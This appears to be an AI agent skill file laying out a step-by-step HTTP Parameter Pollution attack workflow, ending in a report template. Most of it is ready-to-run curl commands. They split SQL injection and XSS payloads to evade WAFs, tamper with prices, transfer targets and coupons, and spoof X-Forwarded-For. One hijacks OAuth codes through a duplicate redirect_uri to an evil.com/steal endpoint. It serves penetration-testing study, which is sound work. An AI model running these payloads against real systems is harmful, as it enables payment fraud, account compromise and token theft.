---
name: performing-http-parameter-pollution-attack
description: Execute HTTP Parameter Pollution attacks to bypass input validation, WAF rules, and security controls by injecting duplicate parameters that are processed differently by front-end and back-end systems.
domain: cybersecurity
subdomain: web-application-security
tags: [http-parameter-pollution, hpp, waf-bypass, input-validation, web-security, parameter-injection, server-parsing]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing HTTP Parameter Pollution Attack

## When to Use
- When testing web applications for input validation bypass vulnerabilities
- During WAF evasion testing to split attack payloads across duplicate parameters
- When assessing how different technology stacks handle duplicate HTTP parameters
- During API security testing to identify parameter precedence issues
- When testing OAuth or payment processing flows for parameter manipulation

## Prerequisites
- Burp Suite Professional with Intruder and Repeater modules
- Understanding of HTTP protocol and query string parsing
- Knowledge of server-side parameter handling differences (first, last, array, concatenated)
- cURL or httpie for manual parameter crafting
- Target application technology stack identification (Apache, IIS, Tomcat, Node.js, etc.)

## Workflow

### Step 1 — Identify Parameter Handling Behavior
```bash
# Test how the server handles duplicate parameters
# Different servers process duplicates differently:
# Apache/PHP: Last parameter value
# ASP.NET/IIS: All values concatenated with comma
# JSP/Tomcat: First parameter value
# Node.js/Express: Array of values
# Python/Flask: First parameter value

curl -v "http://target.com/search?q=first&q=second"
# Observe which value the application uses in the response

# Test POST body duplicate parameters
curl -X POST http://target.com/api/action \
  -d "amount=100&amount=1"
```

### Step 2 — Perform Server-Side HPP
```bash
# Bypass input validation by splitting payload
# Original blocked payload: id=1 OR 1=1
curl "http://target.com/api/user?id=1%20OR%201%3D1"  # Blocked by WAF

# HPP bypass: split across duplicate parameters
curl "http://target.com/api/user?id=1%20OR&id=1%3D1"  # May bypass WAF

# Parameter pollution in POST body
curl -X POST http://target.com/transfer \
  -d "to_account=victim&amount=100&to_account=attacker"

# Override security-critical parameters
curl -X POST http://target.com/api/payment \
  -d "price=99.99&currency=USD&price=0.01"
```

### Step 3 — Perform Client-Side HPP
```bash
# Client-side HPP via URL manipulation
# If application reflects parameters in links:
# Original: http://target.com/page?param=value
# Inject:   http://target.com/page?param=value%26injected_param=evil_value

# Social sharing URL manipulation
curl "http://target.com/share?url=http://legit.com%26callback=http://evil.com"

# Inject into embedded links
curl "http://target.com/redirect?url=http://trusted.com%26token=stolen_value"
```

### Step 4 — Bypass WAF Rules Using HPP
```bash
# WAF typically inspects individual parameter values
# Split SQL injection across parameters
curl "http://target.com/search?q=1' UNION&q=SELECT password FROM users--"

# Split XSS payload
curl "http://target.com/search?q=<script>&q=alert(1)</script>"

# URL-encoded HPP bypass
curl "http://target.com/api/data?filter=admin%26role=superadmin"

# HPP in HTTP headers
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Forwarded-For: attacker-ip" \
     http://target.com/api/admin
```

### Step 5 — Test OAuth and Payment Flow HPP
```bash
# OAuth authorization code HPP
# Inject duplicate redirect_uri to steal authorization code
curl "http://target.com/oauth/authorize?client_id=legit&redirect_uri=https://legit.com/callback&redirect_uri=https://evil.com/steal"

# Payment amount manipulation
curl -X POST http://target.com/api/checkout \
  -d "item=product1&price=100&quantity=1&price=1"

# Coupon code HPP
curl -X POST http://target.com/api/apply-coupon \
  -d "coupon=SAVE10&coupon=SAVE90&coupon=FREE"
```

### Step 6 — Automate HPP Testing
```bash
# Use Burp Intruder with parameter duplication
# In Burp Repeater, manually add duplicate parameters
# Use param-miner Burp extension for automated discovery

# Test with OWASP ZAP HPP scanner
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' \
  http://target.com

# Custom testing with Python
python3 hpp_tester.py --url http://target.com/api/action \
  --params "id,role,amount" --method POST
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Server-Side HPP | Duplicate parameters processed differently by backend causing logic bypass |
| Client-Side HPP | Injected parameters reflected in URLs/links sent to other users |
| Parameter Precedence | Server behavior: first-wins, last-wins, concatenation, or array |
| WAF Evasion | Splitting attack payloads across duplicate parameters to avoid detection |
| Technology-Specific Parsing | Different frameworks handle duplicate parameters uniquely |
| URL Encoding HPP | Using %26 (encoded &) to inject additional parameters within a value |
| Header Pollution | Sending duplicate HTTP headers to exploit forwarding or trust logic |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy for intercepting and duplicating parameters |
| param-miner | Burp extension for discovering hidden and duplicate parameters |
| OWASP ZAP | Automated scanner with HPP detection capabilities |
| Arjun | Hidden HTTP parameter discovery tool |
| ffuf | Fuzzing tool for parameter brute-forcing and duplication testing |
| Wfuzz | Web application fuzzer supporting parameter manipulation |

## Common Scenarios

1. **WAF Bypass** — Split SQL injection or XSS payloads across duplicate parameters where the WAF inspects values individually but the server concatenates them
2. **Payment Manipulation** — Override price or quantity parameters in e-commerce checkout flows by submitting duplicate parameter values
3. **OAuth Redirect Hijacking** — Inject a duplicate redirect_uri parameter to redirect authorization codes to an attacker-controlled server
4. **Access Control Bypass** — Override role or permission parameters in requests to elevate privileges or access restricted resources
5. **Input Validation Bypass** — Circumvent client-side or server-side validation by injecting unexpected duplicate parameters

## Output Format

```
## HTTP Parameter Pollution Assessment Report
- **Target**: http://target.com
- **Server Technology**: ASP.NET/IIS (concatenation behavior)
- **Vulnerability**: Server-Side HPP in payment endpoint

### Parameter Handling Matrix
| Technology | Behavior | Tested |
|-----------|----------|--------|
| Apache/PHP | Last value | Yes |
| IIS/ASP.NET | Comma-concatenated | Yes |
| Node.js | Array | Yes |

### Findings
| # | Endpoint | Parameter | Impact | Severity |
|---|----------|-----------|--------|----------|
| 1 | POST /checkout | price | Price manipulation | Critical |
| 2 | GET /oauth/authorize | redirect_uri | Token theft | High |
| 3 | POST /api/search | q | WAF bypass (SQLi) | High |

### Remediation
- Implement strict parameter validation rejecting duplicate parameters
- Use the first occurrence of any parameter and ignore subsequent duplicates
- Apply WAF rules that detect duplicate parameter patterns
- Validate all parameters server-side regardless of client-side checks
```
